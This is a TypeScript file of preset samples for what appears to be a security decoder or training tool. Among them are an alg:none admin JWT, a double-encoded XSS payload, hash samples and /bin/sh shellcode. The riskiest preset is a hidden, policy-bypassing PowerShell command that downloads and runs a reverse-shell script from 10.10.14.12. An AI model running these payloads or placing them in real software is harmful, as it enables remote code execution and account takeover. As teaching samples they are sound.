export const DECODER_PRESET_OPTIONS = [
  { value: 'vulnerable_jwt', label: 'JWT (alg:none / Admin Claim)', badge: 'JWT' },
  { value: 'base64_payload', label: 'PowerShell Base64 Payload', badge: 'Base64' },
  { value: 'hex_shellcode', label: 'Hex Shellcode (execve /bin/sh)', badge: 'Shellcode' },
  { value: 'mystery_ntlm', label: 'NTLM Windows Hash Sample', badge: 'NTLM' },
  { value: 'mystery_bcrypt', label: 'Bcrypt Password Hash Sample', badge: 'Bcrypt' },
  { value: 'mystery_sha256', label: 'SHA-256 Mystery Hash Sample', badge: 'SHA256' },
  { value: 'url_encoded_xss', label: 'Double URL Encoded XSS', badge: 'URL' },
  { value: 'xor_sample', label: 'XOR Obfuscated Hex String', badge: 'XOR' },
  { value: 'binary_secret', label: '8-Bit Binary Encoded String', badge: 'Binary' },
];

export const DECODER_PRESETS: Record<string, string> = {
  vulnerable_jwt:
    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW5pc3RyYXRvciIsImlzQWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.',
  base64_payload:
    'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object Net.WebClient).DownloadString(\'http://10.10.14.12/rev.ps1\')"',
  hex_shellcode: '31c050682f2f7368682f62696e89e3505389e1b00bcd80',
  mystery_ntlm: 'b4b9b02e6f09a9bd760f388b67351e2b',
  mystery_bcrypt: '$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW',
  mystery_sha256: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
  url_encoded_xss: '%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E',
  xor_sample: '3a3d242720233c3a3b2b',
  binary_secret: '01000001 01100100 01101101 01101001 01101110 01010000 01100001 01110011 01110011',
};
